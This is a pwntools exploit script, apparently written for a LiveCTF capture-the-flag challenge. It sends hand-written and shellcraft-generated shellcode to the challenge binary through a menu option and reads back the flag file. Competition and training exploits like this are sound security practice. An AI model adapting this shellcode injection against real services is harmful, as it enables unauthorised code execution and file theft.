#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../handout/challenge --host localhost --port 31337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or os.environ.get('HOST', 'localhost')
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# pause()

def menu(item: int):
    io.sendlineafter(b"Choice: ", str(item).encode())

def run_prog(lmao: bytes, adjust = True):
    if adjust:
        lmao = lmao.ljust(0x100, b"\x90")
    menu(1)
    io.sendlineafter(b"> ", b"/proc/self/fd/0")
    io.send(lmao)


def run_sh(sh: str):
    lmao = asm(sh)
    run_prog(lmao)

first_sh = """
actual:
.align 0x40
; lea rdx, [rip-0x40-7+16]
mov rdx, 0x000055555555c000
mov rsp, [rdx]
int3
"""

second_sh = """
jmp actual
""" + first_sh

sh = """
lea rbx, [rip-7]
sub rbx, 0x2000
mov rdx, [rbp-0x28]
mov rax, [rbx+8]
mov [rdx+0xc], rax
mov rax, [rbx+16]
mov [rdx+0xc+8], rax
mov rax, [rbx+24]
mov [rdx+0xc+16], rax
mov rax, [rbx+32]
mov [rdx+0xc+24], rax
mov rax, [rbx+40]
mov [rdx+0xc+32], rax
mov rax, [rbx+48]
mov [rdx+0xc+40], rax
mov rax, [rbx+56]
mov [rdx+0xc+48], rax
mov rax, [rbx+64]
mov [rdx+0xc+56], rax
"""

second_asm = asm(second_sh)
second_asm = second_asm[:5]


# run_sh(first_sh)
# menu(2)
# time.sleep(0.5)
# io.interactive()
menu(1)
io.sendlineafter(b"> ", b"/flag")
menu(1)
io.sendlineafter(b"> ", b"/flag")
menu(2)
time.sleep(0.5)
# run_prog(second_asm, adjust=False)
run_sh(sh)
time.sleep(0.5)
menu(2)
io.recvline_contains(b"flag: Failed to complete")
flag = io.recvline().decode().strip()
log.info("flag: LiveCTF{%s", flag)
exit(0)
io.interactive()

sh = """
"""

# sh += shellcraft.open("flag")
sh += shellcraft.cat("flag", fd=2)
sh += """
ret
"""
log.info("Shellcode = %s", sh)
lmao = asm(sh)

run_prog(lmao)

io.interactive()

io.recvline_contains(b"You sent:")
io.sendline(b"./submitter")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

